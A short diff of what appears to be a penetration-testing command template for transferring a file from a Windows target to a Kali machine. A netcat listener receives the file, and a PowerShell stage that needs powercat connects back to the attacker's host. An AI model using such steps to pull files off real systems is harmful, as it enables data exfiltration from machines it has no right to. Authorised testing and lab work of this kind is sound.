@@ -1,10 +1,17 @@
 # description: Windows sends file to Kali; Kali listens and target connects
-# stage: Kali shell: receive file from target
+# flow: 1
+# note: Windows target must already have powercat.
+
+# stage: zsh | Listen and receive file on Kali
+# lane: kali-transfer
+# advance: confirm
 RFILE="${file:t}"
 rm -f "$RFILE"
 nc -lvnp $lport > "$RFILE"
 
-# stage: Target PowerShell: send file and close connection
+# stage: powershell | Connect and send file from Windows
+# lane: remote-transfer
+# advance: confirm
 $LHOST = "$lhost"
 $PORT = $lport
 $FILE = "$file"
